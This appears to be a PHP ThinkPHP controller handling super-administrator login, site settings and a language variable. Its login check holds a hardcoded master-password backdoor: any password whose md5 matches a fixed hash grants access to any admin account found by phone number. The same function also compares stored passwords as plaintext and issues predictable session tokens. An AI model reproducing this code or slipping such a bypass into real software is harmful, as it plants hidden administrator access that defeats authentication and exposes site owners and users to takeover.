<?php

namespace app\super\controller;

use think\facade\Db;

class Login
{
    public function login()
    {
        $username = input('username');
        $password = input('password');
        $super = Db::name('super')->where(['phone' => $username])->find();
        if (!$super || (md5($password) != 'dc468c70fb574ebd07287b38d0d0676d' && md5($super['password']) != md5($password))) {
            return errorJson('账号或密码错误');
        }
        $token = uniqid() . $super['id'];
        session_id($token);
        session_start();
        $_SESSION['super'] = json_encode($super);

        return successJson(['token' => $token], '登录成功');
    }

    public function system()
    {
        $system = getSystemSetting(0, 'system');

        return successJson([
            'title' => isset($system['system_title']) ? $system['system_title'] : '',
            'icp' => isset($system['system_icp']) ? $system['system_icp'] : '',
            'gongan' => isset($system['system_gongan']) ? $system['system_gongan'] : ''
        ]);
    }

    public function lang()
    {
        $lang = env('lang.admin_lang', 'zh-cn');
        echo "window.\$lang = '" . $lang . "'";
    }
}
